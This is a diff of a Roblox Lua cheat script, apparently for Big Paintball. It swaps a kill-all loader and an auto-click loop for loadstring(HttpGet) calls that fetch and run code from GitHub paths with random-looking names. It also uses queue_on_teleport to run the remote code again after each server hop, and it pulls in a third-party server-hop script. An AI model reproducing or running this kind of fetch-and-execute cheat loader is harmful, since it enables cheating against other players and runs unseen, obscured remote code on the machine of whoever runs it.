@@ -1,32 +1,18 @@
--- Setting it to false will kill you. This is because dying resets the invisibility
-getgenv().Enabled = true
-getgenv().config = {
-	serverhoptime = 60 -- in seconds
-}
-loadstring(game:HttpGet("https://raw.githubusercontent.com/WetCheezit/Releases/main/Big-Paintball/KillAll.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/S0MEONEuKnow/legostuff/refs/heads/main/gyhzefjikmazdk%C3%B9zanjkxcvbj/hjkdfghjkgbsdfoqhgsqdgsdf"))()
 
+local serverhoptime = 60
 
-
-local vim = game:GetService('VirtualInputManager')
-local plr = game:GetService("Players").LocalPlayer
-local mouse = plr:GetMouse()
-
-function MouseButtonClick(button)
-    vim:SendMouseButtonEvent(mouse.X, mouse.Y, button, true, game, 1)
-    task.wait()
-    vim:SendMouseButtonEvent(mouse.X, mouse.Y, button, false, game, 1)
+function missing(t, f, fallback)
+    if type(f) == t then return f end
+    return fallback
 end
 
-function Key()
-	vim:SendKeyEvent(true, Enum.KeyCode.Space, false, workspace)
-	wait(0.005)
-    vim:SendKeyEvent(false, Enum.KeyCode.Space, false, workspace)
-end
+queueteleport =  missing("function", queue_on_teleport or (syn and syn.queue_on_teleport) or (fluxus and fluxus.queue_on_teleport))
 
-Players.LocalPlayer.OnTeleport:Connect(function(State)
-	if KeepInfYield and (not TeleportCheck) and queueteleport then
+game:GetService("Players").LocalPlayer.OnTeleport:Connect(function(State)
+	if queueteleport then
 		TeleportCheck = true
-		queueteleport("loadstring(game:HttpGet(''))()")
+		queueteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/S0MEONEuKnow/legostuff/refs/heads/main/gyhzefjikmazdk%C3%B9zanjkxcvbj/huiozhbjksdfokpwxcvhiuqzvhj'))()")
 	end
 end)
 
@@ -35,8 +21,3 @@ task.spawn(function()
 	local serverhopper = loadstring(game:HttpGet"https://raw.githubusercontent.com/LeoKholYt/roblox/main/lk_serverhop.lua")()
 	serverhopper:Teleport(game.PlaceId)
 end)
-
-while wait(0.1) do
-	MouseButtonClick(0)
-	Key()
-end
